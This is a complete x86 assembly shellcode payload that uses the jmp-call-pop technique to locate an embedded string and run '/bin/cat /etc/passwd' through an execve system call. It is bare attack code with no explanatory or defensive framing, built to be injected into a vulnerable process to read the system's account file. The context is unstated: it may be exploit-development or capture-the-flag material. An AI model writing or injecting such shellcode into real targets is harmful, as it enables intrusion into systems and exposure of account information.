        .intel_syntax noprefix
        .globl _start
_start:
        jmp caller
callee:
        pop eax
        xor edx, edx
        lea ecx, [eax+1]
        mov esi, ecx
        add cl, [eax]
        mov [ecx], dl
        push edx
        push 0x7461632f
        push 0x6e69622f    /* "/bin/cat" */
        mov ebx, esp
        push edx
        push esi
        push ebx
        mov ecx, esp
        lea eax, [edx+11]  /* execve */
        int 0x80
caller:
        call callee
pstring:
        .byte 11
        .ascii "/etc/passwd"
